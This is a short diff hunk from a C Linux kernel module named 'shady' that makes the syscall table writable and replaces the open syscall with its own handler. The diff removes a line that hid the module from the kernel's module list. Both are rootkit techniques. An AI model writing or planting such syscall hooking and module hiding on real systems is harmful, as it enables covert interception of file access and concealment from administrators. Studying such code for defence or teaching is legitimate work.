@@ -292,7 +292,6 @@ shady_init_module(void)
   set_addr_rw(*sys_call_table_address);
   (sys_call_table_address)[__NR_open] = my_open;
 
-  list_del_init(&__this_module.list);
   return 0; /* success */
 
  fail:
